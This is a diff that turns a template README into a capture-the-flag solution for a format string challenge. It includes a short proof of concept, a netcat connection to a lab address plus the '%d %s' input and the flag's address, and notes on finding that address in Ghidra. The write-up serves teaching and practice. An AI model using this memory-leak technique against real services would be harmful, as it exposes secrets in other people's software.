@@ -1,10 +1,19 @@
-# How to Solve the Challenge?
+# Solution
+The challenge revolves around a format string vulnerability, and the flag is a harcoded string. The flag can be easily
+dumped once its address is known.
 
-Provide reproducible steps to solve the challenge. This can include:
+## Quick PoC
+```
+# Replace port and ip with real ones
+nc 127.25.0.2 2025
 
-- Runnable code (e.g., `PoC.py`)
-- A Bash script or a sequence of commented commands
-- Well-explained instructions
-- ...
+# Enter "%d %s" when asked for username
+# Enter "4210848" when asked for answer
+# Get the flag
+```
 
-Ensure that all dependencies required to build or run the solution are provided (e.g., `requirements.txt`) or thoroughly documented.
+## Locating the address
+- Open the flagless binary `one-hundred-percent-wrong-using-dummy-flag` using Ghidra
+- Inspect strings and locate flag address (`0x4040a0 == 4210848`)
+
+  ![](./locating-flag-addr.png)
